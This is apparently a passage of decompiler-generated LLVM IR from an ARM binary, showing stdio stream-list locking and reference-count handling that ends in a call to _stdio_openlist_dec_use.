  %v0_2a0f8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2a0fc.pre = load i32, i32* @r4, align 4
  %v1_2a0f8 = inttoptr i32 %v0_2a0f8.pre to i32*
  %v2_2a0f8 = load i32, i32* %v1_2a0f8, align 4
  store i32 %v2_2a0f8, i32* %r3.global-to-local, align 4
  %v3_2a0fc = icmp uge i32 %v2_2a0f8, %v1_2a0fc.pre
  store i1 %v3_2a0fc, i1* %cpsr_c.global-to-local, align 1
  %v9_2a0fc = icmp eq i32 %v2_2a0f8, %v1_2a0fc.pre
  br i1 %v9_2a0fc, label %dec_label_pc_2a104, label %dec_label_pc_2a11c

dec_label_pc_2a118:                               ; preds = %dec_label_pc_2a104
  %v0_2a118 = load i32, i32* @r4, align 4
  store i32 %v0_2a118, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2a11c

dec_label_pc_2a11c:                               ; preds = %dec_label_pc_2a0ec, %dec_label_pc_2a104.dec_label_pc_2a0f8_crit_edge, %dec_label_pc_2a118
  %v0_2a11c = phi i32 [ %v0_2a118, %dec_label_pc_2a118 ], [ %v2_2a0f8109, %dec_label_pc_2a0ec ], [ %v2_2a0f8, %dec_label_pc_2a104.dec_label_pc_2a0f8_crit_edge ]
  %v1_2a11c = phi i32 [ %v0_2a118, %dec_label_pc_2a118 ], [ 0, %dec_label_pc_2a0ec ], [ %v1_2a0fc.pre, %dec_label_pc_2a104.dec_label_pc_2a0f8_crit_edge ]
  %v3_2a11c = icmp uge i32 %v0_2a11c, %v1_2a11c
  store i1 %v3_2a11c, i1* %cpsr_c.global-to-local, align 1
  %v9_2a11c = icmp eq i32 %v0_2a11c, %v1_2a11c
  br i1 %v9_2a11c, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_2a11c
  %v1_2a120 = load i32, i32* @r7, align 4
  store i32 %v1_2a120, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_2a11c, %bb46
  %v1_2a124 = xor i1 %v9_2a11c, true
  call void @__pseudo_cond_branch(i1 %v1_2a124, i32 ptrtoint (i32* @global_var_27dec.3092 to i32))
  %v0_2a128 = load i32, i32* %sl.global-to-local, align 4
  %v1_2a128 = load i32, i32* @r7, align 4
  %v2_2a128 = add i32 %v1_2a128, 8
  %v3_2a128 = inttoptr i32 %v2_2a128 to i32*
  store i32 %v0_2a128, i32* %v3_2a128, align 4
  br label %dec_label_pc_2a12c

dec_label_pc_2a12c:                               ; preds = %bb45, %bb47
  store i32 176, i32* %r3.global-to-local, align 4
  %v0_2a130 = load i32, i32* @r8, align 4
  %v2_2a130 = add i32 %v0_2a130, 176
  %v3_2a130 = inttoptr i32 %v2_2a130 to i32*
  %v4_2a130 = load i32, i32* %v3_2a130, align 4
  store i32 %v4_2a130, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_2a138 = add i32 %v0_2a130, 12
  %v3_2a138 = inttoptr i32 %v2_2a138 to i32*
  %v4_2a138 = load i32, i32* %v3_2a138, align 4
  store i32 %v4_2a138, i32* %r2.global-to-local, align 4
  %v1_2a13c = add i32 %v4_2a130, 4
  %v2_2a13c = inttoptr i32 %v1_2a13c to i32*
  %v3_2a13c = load i32, i32* %v2_2a13c, align 4
  store i32 %v3_2a13c, i32* %r1.global-to-local, align 4
  %v1_2a140 = inttoptr i32 %v4_2a138 to i32*
  %v2_2a140 = load i32, i32* %v1_2a140, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2a144 = icmp eq i32 %v3_2a13c, 0
  %v1_2a148 = add i32 %v2_2a140, 1
  store i32 %v1_2a148, i32* %r3.global-to-local, align 4
  store i32 %v1_2a148, i32* %v1_2a140, align 4
  br i1 %v2_2a144, label %dec_label_pc_2a154, label %dec_label_pc_2a1b4

dec_label_pc_2a154:                               ; preds = %dec_label_pc_2a12c
  %v0_2a154 = load i32, i32* %r1.global-to-local, align 4
  %v1_2a154 = load i32, i32* %r0.global-to-local, align 4
  %v2_2a154 = add i32 %v1_2a154, 8
  %v3_2a154 = inttoptr i32 %v2_2a154 to i32*
  store i32 %v0_2a154, i32* %v3_2a154, align 4
  %v0_2a158 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2a158, i32* @r7, align 4
  br label %dec_label_pc_2a15c

dec_label_pc_2a15c:                               ; preds = %dec_label_pc_2a18c.dec_label_pc_2a15c_crit_edge, %dec_label_pc_2a154
  %v0_2a15c = phi i32 [ %v0_2a15c.pre, %dec_label_pc_2a18c.dec_label_pc_2a15c_crit_edge ], [ %v0_2a158, %dec_label_pc_2a154 ]
  %v1_2a15c = inttoptr i32 %v0_2a15c to i32*
  %v2_2a15c = load i32, i32* %v1_2a15c, align 4
  store i32 %v2_2a15c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_2a15c, i32* %r2.global-to-local, align 4
  %v2_2a16896 = load i32, i32* %v1_2a15c, align 4
  store i32 %v2_2a16896, i32* %r3.global-to-local, align 4
  %v3_2a16c98 = icmp uge i32 %v2_2a16896, %v2_2a15c
  store i1 %v3_2a16c98, i1* %cpsr_c.global-to-local, align 1
  %v9_2a16c104 = icmp eq i32 %v2_2a16896, %v2_2a15c
  br i1 %v9_2a16c104, label %dec_label_pc_2a174, label %dec_label_pc_2a18c

dec_label_pc_2a174:                               ; preds = %dec_label_pc_2a15c, %dec_label_pc_2a174.dec_label_pc_2a168_crit_edge
  %v0_2a174105 = phi i32 [ %v1_2a16c.pre, %dec_label_pc_2a174.dec_label_pc_2a168_crit_edge ], [ %v2_2a15c, %dec_label_pc_2a15c ]
  store i32 %v0_2a174105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2a184 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2a184, label %dec_label_pc_2a188, label %dec_label_pc_2a174.dec_label_pc_2a168_crit_edge

dec_label_pc_2a174.dec_label_pc_2a168_crit_edge:  ; preds = %dec_label_pc_2a174
  %v0_2a168.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2a16c.pre = load i32, i32* @r4, align 4
  %v1_2a168 = inttoptr i32 %v0_2a168.pre to i32*
  %v2_2a168 = load i32, i32* %v1_2a168, align 4
  store i32 %v2_2a168, i32* %r3.global-to-local, align 4
  %v3_2a16c = icmp uge i32 %v2_2a168, %v1_2a16c.pre
  store i1 %v3_2a16c, i1* %cpsr_c.global-to-local, align 1
  %v9_2a16c = icmp eq i32 %v2_2a168, %v1_2a16c.pre
  br i1 %v9_2a16c, label %dec_label_pc_2a174, label %dec_label_pc_2a18c

dec_label_pc_2a188:                               ; preds = %dec_label_pc_2a174
  %v0_2a188 = load i32, i32* @r4, align 4
  store i32 %v0_2a188, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2a18c

dec_label_pc_2a18c:                               ; preds = %dec_label_pc_2a15c, %dec_label_pc_2a174.dec_label_pc_2a168_crit_edge, %dec_label_pc_2a188
  %v0_2a194 = phi i32 [ %v0_2a188, %dec_label_pc_2a188 ], [ %v2_2a16896, %dec_label_pc_2a15c ], [ %v2_2a168, %dec_label_pc_2a174.dec_label_pc_2a168_crit_edge ]
  %v1_2a18c = phi i32 [ %v0_2a188, %dec_label_pc_2a188 ], [ %v2_2a15c, %dec_label_pc_2a15c ], [ %v1_2a16c.pre, %dec_label_pc_2a174.dec_label_pc_2a168_crit_edge ]
  %v3_2a18c = icmp uge i32 %v0_2a194, %v1_2a18c
  store i1 %v3_2a18c, i1* %cpsr_c.global-to-local, align 1
  %v9_2a18c = icmp eq i32 %v0_2a194, %v1_2a18c
  br i1 %v9_2a18c, label %dec_label_pc_2a194, label %dec_label_pc_2a18c.dec_label_pc_2a15c_crit_edge

dec_label_pc_2a18c.dec_label_pc_2a15c_crit_edge:  ; preds = %dec_label_pc_2a18c
  %v0_2a15c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_2a15c

dec_label_pc_2a194:                               ; preds = %dec_label_pc_2a18c
  %v2_2a194 = icmp ne i32 %v1_2a18c, 0
  store i1 %v2_2a194, i1* %cpsr_c.global-to-local, align 1
  %v7_2a198 = icmp slt i32 %v1_2a18c, 2
  br i1 %v7_2a198, label %dec_label_pc_2a1b4, label %dec_label_pc_2a19c

dec_label_pc_2a19c:                               ; preds = %dec_label_pc_2a194
  %v0_2a19c = load i32, i32* @r7, align 4
  store i32 %v0_2a19c, i32* %r0.global-to-local, align 4
  %v0_2a1a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_2a1a0 = add i32 %v0_2a1a0, 129
  store i32 %v1_2a1a0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2a1b4

dec_label_pc_2a1b4:                               ; preds = %dec_label_pc_2a12c, %dec_label_pc_2a19c, %dec_label_pc_2a194
  %v0_2a1b4 = load i32, i32* @r5, align 4
  %v1_2a1b4 = inttoptr i32 %v0_2a1b4 to i16*
  %v2_2a1b4 = load i16, i16* %v1_2a1b4, align 2
  %v3_2a1b4 = zext i16 %v2_2a1b4 to i32
  %v1_2a1b8 = and i32 %v3_2a1b4, 24576
  %v1_2a1bc = or i32 %v1_2a1b8, 48
  store i32 %v1_2a1bc, i32* %r3.global-to-local, align 4
  %v0_2a1c0 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2a1c0 = icmp eq i32 %v0_2a1c0, 0
  %v1_2a1c4 = trunc i32 %v1_2a1bc to i16
  store i16 %v1_2a1c4, i16* %v1_2a1b4, align 2
  br i1 %v2_2a1c0, label %dec_label_pc_2a1cc, label %dec_label_pc_2a240

dec_label_pc_2a1cc:                               ; preds = %dec_label_pc_2a1b4
  %v0_2a1cc = load i32, i32* @r5, align 4
  %v1_2a1cc = add i32 %v0_2a1cc, 60
  %v2_2a1cc = inttoptr i32 %v1_2a1cc to i32*
  %v3_2a1cc = load i32, i32* %v2_2a1cc, align 4
  %v1_2a1d0 = add i32 %v3_2a1cc, -1
  store i32 %v1_2a1d0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2a1d4 = icmp eq i32 %v1_2a1d0, 0
  store i32 %v1_2a1d0, i32* %v2_2a1cc, align 4
  br i1 %v2_2a1d4, label %dec_label_pc_2a1e0, label %dec_label_pc_2a240

dec_label_pc_2a1e0:                               ; preds = %dec_label_pc_2a1cc
  %v0_2a1e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_2a1e0 = load i32, i32* @r5, align 4
  %v2_2a1e0 = add i32 %v1_2a1e0, 64
  %v3_2a1e0 = inttoptr i32 %v2_2a1e0 to i32*
  store i32 %v0_2a1e0, i32* %v3_2a1e0, align 4
  %v0_2a1e4 = load i32, i32* @r5, align 4
  %v1_2a1e4 = add i32 %v0_2a1e4, 56
  store i32 %v1_2a1e4, i32* @r6, align 4
  br label %dec_label_pc_2a1e8

dec_label_pc_2a1e8:                               ; preds = %dec_label_pc_2a218.dec_label_pc_2a1e8_crit_edge, %dec_label_pc_2a1e0
  %v0_2a1f0 = phi i32 [ %v0_2a1f0.pre, %dec_label_pc_2a218.dec_label_pc_2a1e8_crit_edge ], [ %v1_2a1e4, %dec_label_pc_2a1e0 ]
  %v0_2a1e8 = phi i32 [ %v0_2a1e8.pre, %dec_label_pc_2a218.dec_label_pc_2a1e8_crit_edge ], [ %v0_2a1e4, %dec_label_pc_2a1e0 ]
  %v1_2a1e8 = add i32 %v0_2a1e8, 56
  %v2_2a1e8 = inttoptr i32 %v1_2a1e8 to i32*
  %v3_2a1e8 = load i32, i32* %v2_2a1e8, align 4
  store i32 %v3_2a1e8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_2a1f0, i32* %r2.global-to-local, align 4
  %v1_2a1f482 = inttoptr i32 %v0_2a1f0 to i32*
  %v2_2a1f483 = load i32, i32* %v1_2a1f482, align 4
  store i32 %v2_2a1f483, i32* %r3.global-to-local, align 4
  %v3_2a1f885 = icmp uge i32 %v2_2a1f483, %v3_2a1e8
  store i1 %v3_2a1f885, i1* %cpsr_c.global-to-local, align 1
  %v9_2a1f891 = icmp eq i32 %v2_2a1f483, %v3_2a1e8
  br i1 %v9_2a1f891, label %dec_label_pc_2a200, label %dec_label_pc_2a218

dec_label_pc_2a200:                               ; preds = %dec_label_pc_2a1e8, %dec_label_pc_2a200.dec_label_pc_2a1f4_crit_edge
  %v0_2a20092 = phi i32 [ %v1_2a1f8.pre, %dec_label_pc_2a200.dec_label_pc_2a1f4_crit_edge ], [ %v3_2a1e8, %dec_label_pc_2a1e8 ]
  store i32 %v0_2a20092, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2a210 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2a210, label %dec_label_pc_2a214, label %dec_label_pc_2a200.dec_label_pc_2a1f4_crit_edge

dec_label_pc_2a200.dec_label_pc_2a1f4_crit_edge:  ; preds = %dec_label_pc_2a200
  %v0_2a1f4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2a1f8.pre = load i32, i32* @r4, align 4
  %v1_2a1f4 = inttoptr i32 %v0_2a1f4.pre to i32*
  %v2_2a1f4 = load i32, i32* %v1_2a1f4, align 4
  store i32 %v2_2a1f4, i32* %r3.global-to-local, align 4
  %v3_2a1f8 = icmp uge i32 %v2_2a1f4, %v1_2a1f8.pre
  store i1 %v3_2a1f8, i1* %cpsr_c.global-to-local, align 1
  %v9_2a1f8 = icmp eq i32 %v2_2a1f4, %v1_2a1f8.pre
  br i1 %v9_2a1f8, label %dec_label_pc_2a200, label %dec_label_pc_2a218

dec_label_pc_2a214:                               ; preds = %dec_label_pc_2a200
  %v0_2a214 = load i32, i32* @r4, align 4
  store i32 %v0_2a214, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2a218

dec_label_pc_2a218:                               ; preds = %dec_label_pc_2a1e8, %dec_label_pc_2a200.dec_label_pc_2a1f4_crit_edge, %dec_label_pc_2a214
  %v0_2a220 = phi i32 [ %v0_2a214, %dec_label_pc_2a214 ], [ %v2_2a1f483, %dec_label_pc_2a1e8 ], [ %v2_2a1f4, %dec_label_pc_2a200.dec_label_pc_2a1f4_crit_edge ]
  %v1_2a218 = phi i32 [ %v0_2a214, %dec_label_pc_2a214 ], [ %v3_2a1e8, %dec_label_pc_2a1e8 ], [ %v1_2a1f8.pre, %dec_label_pc_2a200.dec_label_pc_2a1f4_crit_edge ]
  %v3_2a218 = icmp uge i32 %v0_2a220, %v1_2a218
  store i1 %v3_2a218, i1* %cpsr_c.global-to-local, align 1
  %v9_2a218 = icmp eq i32 %v0_2a220, %v1_2a218
  br i1 %v9_2a218, label %dec_label_pc_2a220, label %dec_label_pc_2a218.dec_label_pc_2a1e8_crit_edge

dec_label_pc_2a218.dec_label_pc_2a1e8_crit_edge:  ; preds = %dec_label_pc_2a218
  %v0_2a1e8.pre = load i32, i32* @r5, align 4
  %v0_2a1f0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_2a1e8

dec_label_pc_2a220:                               ; preds = %dec_label_pc_2a218
  %v2_2a220 = icmp ne i32 %v1_2a218, 0
  store i1 %v2_2a220, i1* %cpsr_c.global-to-local, align 1
  %v7_2a224 = icmp slt i32 %v1_2a218, 2
  br i1 %v7_2a224, label %dec_label_pc_2a240, label %dec_label_pc_2a228

dec_label_pc_2a228:                               ; preds = %dec_label_pc_2a220
  %v0_2a228 = load i32, i32* @r5, align 4
  %v1_2a228 = add i32 %v0_2a228, 56
  store i32 %v1_2a228, i32* %r0.global-to-local, align 4
  %v0_2a22c = load i32, i32* %r1.global-to-local, align 4
  %v1_2a22c = add i32 %v0_2a22c, 129
  store i32 %v1_2a22c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2a240

dec_label_pc_2a240:                               ; preds = %dec_label_pc_2a1cc, %dec_label_pc_2a1b4, %dec_label_pc_2a228, %dec_label_pc_2a220
  %v0_2a240 = load i32, i32* @r5, align 4
  %v1_2a240 = inttoptr i32 %v0_2a240 to i16*
  %v2_2a240 = load i16, i16* %v1_2a240, align 2
  %v3_2a240 = zext i16 %v2_2a240 to i32
  store i32 %v3_2a240, i32* %r3.global-to-local, align 4
  %v1_2a244 = and i32 %v3_2a240, 16384
  %v2_2a244 = icmp eq i32 %v1_2a244, 0
  br i1 %v2_2a244, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_2a240
  %v2_2a248 = add i32 %v0_2a240, 8
  %v3_2a248 = inttoptr i32 %v2_2a248 to i32*
  %v4_2a248 = load i32, i32* %v3_2a248, align 4
  store i32 %v4_2a248, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_2a240, %bb48
  %v1_2a24c = xor i1 %v2_2a244, true
  call void @__pseudo_cond_branch(i1 %v1_2a24c, i32 ptrtoint (i32* @global_var_264e8.3412 to i32))
  store i32 176, i32* %r3.global-to-local, align 4
  %v0_2a254 = load i32, i32* @r8, align 4
  %v2_2a254 = add i32 %v0_2a254, 176
  %v3_2a254 = inttoptr i32 %v2_2a254 to i32*
  %v4_2a254 = load i32, i32* %v3_2a254, align 4
  store i32 %v4_2a254, i32* @r5, align 4
  %v1_2a258 = add i32 %v4_2a254, 8
  %v2_2a258 = inttoptr i32 %v1_2a258 to i32*
  %v3_2a258 = load i32, i32* %v2_2a258, align 4
  store i32 %v3_2a258, i32* %r3.global-to-local, align 4
  %v1_2a25c = load i32, i32* %sl.global-to-local, align 4
  %v3_2a25c = icmp uge i32 %v3_2a258, %v1_2a25c
  store i1 %v3_2a25c, i1* %cpsr_c.global-to-local, align 1
  %v9_2a25c = icmp eq i32 %v3_2a258, %v1_2a25c
  br i1 %v9_2a25c, label %dec_label_pc_2a2a4, label %dec_label_pc_2a264

dec_label_pc_2a264:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_2a254, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_2a27075 = inttoptr i32 %v4_2a254 to i32*
  %v2_2a27076 = load i32, i32* %v1_2a27075, align 4
  store i32 %v2_2a27076, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_2a27478 = icmp eq i32 %v2_2a27076, 0
  br i1 %v9_2a27478, label %dec_label_pc_2a27c, label %dec_label_pc_2a294

dec_label_pc_2a27c:                               ; preds = %dec_label_pc_2a264, %dec_label_pc_2a27c.dec_label_pc_2a270_crit_edge
  %v0_2a27c79 = phi i32 [ %v1_2a274.pre, %dec_label_pc_2a27c.dec_label_pc_2a270_crit_edge ], [ 0, %dec_label_pc_2a264 ]
  store i32 %v0_2a27c79, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2a28c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2a28c, label %dec_label_pc_2a290, label %dec_label_pc_2a27c.dec_label_pc_2a270_crit_edge

dec_label_pc_2a27c.dec_label_pc_2a270_crit_edge:  ; preds = %dec_label_pc_2a27c
  %v0_2a270.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2a274.pre = load i32, i32* @r4, align 4
  %v1_2a270 = inttoptr i32 %v0_2a270.pre to i32*
  %v2_2a270 = load i32, i32* %v1_2a270, align 4
  store i32 %v2_2a270, i32* %r3.global-to-local, align 4
  %v3_2a274 = icmp uge i32 %v2_2a270, %v1_2a274.pre
  store i1 %v3_2a274, i1* %cpsr_c.global-to-local, align 1
  %v9_2a274 = icmp eq i32 %v2_2a270, %v1_2a274.pre
  br i1 %v9_2a274, label %dec_label_pc_2a27c, label %dec_label_pc_2a294

dec_label_pc_2a290:                               ; preds = %dec_label_pc_2a27c
  %v0_2a290 = load i32, i32* @r4, align 4
  store i32 %v0_2a290, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2a294

dec_label_pc_2a294:                               ; preds = %dec_label_pc_2a264, %dec_label_pc_2a27c.dec_label_pc_2a270_crit_edge, %dec_label_pc_2a290
  %v0_2a294 = phi i32 [ %v0_2a290, %dec_label_pc_2a290 ], [ %v2_2a27076, %dec_label_pc_2a264 ], [ %v2_2a270, %dec_label_pc_2a27c.dec_label_pc_2a270_crit_edge ]
  %v1_2a294 = phi i32 [ %v0_2a290, %dec_label_pc_2a290 ], [ 0, %dec_label_pc_2a264 ], [ %v1_2a274.pre, %dec_label_pc_2a27c.dec_label_pc_2a270_crit_edge ]
  %v3_2a294 = icmp uge i32 %v0_2a294, %v1_2a294
  store i1 %v3_2a294, i1* %cpsr_c.global-to-local, align 1
  %v9_2a294 = icmp eq i32 %v0_2a294, %v1_2a294
  br i1 %v9_2a294, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_2a294
  %v1_2a298 = load i32, i32* @r5, align 4
  store i32 %v1_2a298, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_2a294, %bb50
  %v1_2a29c = xor i1 %v9_2a294, true
  call void @__pseudo_cond_branch(i1 %v1_2a29c, i32 ptrtoint (i32* @global_var_27dec.3092 to i32))
  %v0_2a2a0 = load i32, i32* %sl.global-to-local, align 4
  %v1_2a2a0 = load i32, i32* @r5, align 4
  %v2_2a2a0 = add i32 %v1_2a2a0, 8
  %v3_2a2a0 = inttoptr i32 %v2_2a2a0 to i32*
  store i32 %v0_2a2a0, i32* %v3_2a2a0, align 4
  %v0_2a2a8.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_2a2a4

dec_label_pc_2a2a4:                               ; preds = %bb49, %bb51
  %v0_2a2a8 = phi i32 [ %v0_2a254, %bb49 ], [ %v0_2a2a8.pre, %bb51 ]
  store i32 92, i32* %r3.global-to-local, align 4
  %v2_2a2a8 = add i32 %v0_2a2a8, 92
  %v3_2a2a8 = inttoptr i32 %v2_2a2a8 to i32*
  %v4_2a2a8 = load i32, i32* %v3_2a2a8, align 4
  store i32 %v4_2a2a8, i32* %r2.global-to-local, align 4
  store i32 176, i32* %r3.global-to-local, align 4
  %v2_2a2b0 = add i32 %v0_2a2a8, 176
  %v3_2a2b0 = inttoptr i32 %v2_2a2b0 to i32*
  %v4_2a2b0 = load i32, i32* %v3_2a2b0, align 4
  store i32 %v4_2a2b0, i32* %r0.global-to-local, align 4
  %v1_2a2b4 = inttoptr i32 %v4_2a2a8 to i32*
  %v2_2a2b4 = load i32, i32* %v1_2a2b4, align 4
  store i32 %v2_2a2b4, i32* %r3.global-to-local, align 4
  %v1_2a2b8 = add i32 %v4_2a2b0, 4
  %v2_2a2b8 = inttoptr i32 %v1_2a2b8 to i32*
  %v3_2a2b8 = load i32, i32* %v2_2a2b8, align 4
  store i32 %v3_2a2b8, i32* %r1.global-to-local, align 4
  %v1_2a2bc = add i32 %v2_2a2b4, 1
  store i32 %v1_2a2bc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2a2c0 = icmp eq i32 %v3_2a2b8, 0
  store i32 %v1_2a2bc, i32* %v1_2a2b4, align 4
  br i1 %v2_2a2c0, label %dec_label_pc_2a2cc, label %dec_label_pc_2a32c

dec_label_pc_2a2cc:                               ; preds = %dec_label_pc_2a2a4
  %v0_2a2cc = load i32, i32* %r1.global-to-local, align 4
  %v1_2a2cc = load i32, i32* %r0.global-to-local, align 4
  %v2_2a2cc = add i32 %v1_2a2cc, 8
  %v3_2a2cc = inttoptr i32 %v2_2a2cc to i32*
  store i32 %v0_2a2cc, i32* %v3_2a2cc, align 4
  %v0_2a2d0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2a2d0, i32* @r5, align 4
  br label %dec_label_pc_2a2d4

dec_label_pc_2a2d4:                               ; preds = %dec_label_pc_2a304.dec_label_pc_2a2d4_crit_edge, %dec_label_pc_2a2cc
  %v0_2a2d4 = phi i32 [ %v0_2a2d4.pre, %dec_label_pc_2a304.dec_label_pc_2a2d4_crit_edge ], [ %v0_2a2d0, %dec_label_pc_2a2cc ]
  %v1_2a2d4 = inttoptr i32 %v0_2a2d4 to i32*
  %v2_2a2d4 = load i32, i32* %v1_2a2d4, align 4
  store i32 %v2_2a2d4, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_2a2d4, i32* %r2.global-to-local, align 4
  %v2_2a2e064 = load i32, i32* %v1_2a2d4, align 4
  store i32 %v2_2a2e064, i32* %r3.global-to-local, align 4
  %v3_2a2e466 = icmp uge i32 %v2_2a2e064, %v2_2a2d4
  store i1 %v3_2a2e466, i1* %cpsr_c.global-to-local, align 1
  %v9_2a2e472 = icmp eq i32 %v2_2a2e064, %v2_2a2d4
  br i1 %v9_2a2e472, label %dec_label_pc_2a2ec, label %dec_label_pc_2a304

dec_label_pc_2a2ec:                               ; preds = %dec_label_pc_2a2d4, %dec_label_pc_2a2ec.dec_label_pc_2a2e0_crit_edge
  %v0_2a2ec73 = phi i32 [ %v1_2a2e4.pre, %dec_label_pc_2a2ec.dec_label_pc_2a2e0_crit_edge ], [ %v2_2a2d4, %dec_label_pc_2a2d4 ]
  store i32 %v0_2a2ec73, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2a2fc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2a2fc, label %dec_label_pc_2a300, label %dec_label_pc_2a2ec.dec_label_pc_2a2e0_crit_edge

dec_label_pc_2a2ec.dec_label_pc_2a2e0_crit_edge:  ; preds = %dec_label_pc_2a2ec
  %v0_2a2e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2a2e4.pre = load i32, i32* @r4, align 4
  %v1_2a2e0 = inttoptr i32 %v0_2a2e0.pre to i32*
  %v2_2a2e0 = load i32, i32* %v1_2a2e0, align 4
  store i32 %v2_2a2e0, i32* %r3.global-to-local, align 4
  %v3_2a2e4 = icmp uge i32 %v2_2a2e0, %v1_2a2e4.pre
  store i1 %v3_2a2e4, i1* %cpsr_c.global-to-local, align 1
  %v9_2a2e4 = icmp eq i32 %v2_2a2e0, %v1_2a2e4.pre
  br i1 %v9_2a2e4, label %dec_label_pc_2a2ec, label %dec_label_pc_2a304

dec_label_pc_2a300:                               ; preds = %dec_label_pc_2a2ec
  %v0_2a300 = load i32, i32* @r4, align 4
  store i32 %v0_2a300, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2a304

dec_label_pc_2a304:                               ; preds = %dec_label_pc_2a2d4, %dec_label_pc_2a2ec.dec_label_pc_2a2e0_crit_edge, %dec_label_pc_2a300
  %v0_2a30c = phi i32 [ %v0_2a300, %dec_label_pc_2a300 ], [ %v2_2a2e064, %dec_label_pc_2a2d4 ], [ %v2_2a2e0, %dec_label_pc_2a2ec.dec_label_pc_2a2e0_crit_edge ]
  %v1_2a304 = phi i32 [ %v0_2a300, %dec_label_pc_2a300 ], [ %v2_2a2d4, %dec_label_pc_2a2d4 ], [ %v1_2a2e4.pre, %dec_label_pc_2a2ec.dec_label_pc_2a2e0_crit_edge ]
  %v3_2a304 = icmp uge i32 %v0_2a30c, %v1_2a304
  store i1 %v3_2a304, i1* %cpsr_c.global-to-local, align 1
  %v9_2a304 = icmp eq i32 %v0_2a30c, %v1_2a304
  br i1 %v9_2a304, label %dec_label_pc_2a30c, label %dec_label_pc_2a304.dec_label_pc_2a2d4_crit_edge

dec_label_pc_2a304.dec_label_pc_2a2d4_crit_edge:  ; preds = %dec_label_pc_2a304
  %v0_2a2d4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2a2d4

dec_label_pc_2a30c:                               ; preds = %dec_label_pc_2a304
  %v2_2a30c = icmp ne i32 %v1_2a304, 0
  store i1 %v2_2a30c, i1* %cpsr_c.global-to-local, align 1
  %v7_2a310 = icmp slt i32 %v1_2a304, 2
  br i1 %v7_2a310, label %dec_label_pc_2a32c, label %dec_label_pc_2a314

dec_label_pc_2a314:                               ; preds = %dec_label_pc_2a30c
  %v0_2a314 = load i32, i32* @r5, align 4
  store i32 %v0_2a314, i32* %r0.global-to-local, align 4
  %v0_2a318 = load i32, i32* %r1.global-to-local, align 4
  %v1_2a318 = add i32 %v0_2a318, 129
  store i32 %v1_2a318, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2a32c

dec_label_pc_2a32c:                               ; preds = %dec_label_pc_2a2a4, %dec_label_pc_2a314, %dec_label_pc_2a30c
  %v0_2a32c = call i32 @_stdio_openlist_dec_use()
  %v0_2a330 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_2a330, i32* %r0.global-to-local, align 4
  %v2_2a338 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_2a338, i32* @r4, align 4
  store i32 %v6_2a020, i32* @r5, align 4
  store i32 %v9_2a020, i32* @r6, align 4
  store i32 %v12_2a020, i32* @r7, align 4
  store i32 %v15_2a020, i32* @r8, align 4
  store i32 %v27_2a020, i32* @lr, align 4
  ret i32 %v0_2a330

; uselistorder directives
  uselistorder i32 %v0_2a300, { 1, 0, 2 }
  uselistorder i32 %v1_2a2e4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_2a2d4, { 1, 0 }
  uselistorder i32 %v0_2a2a8, { 1, 0 }
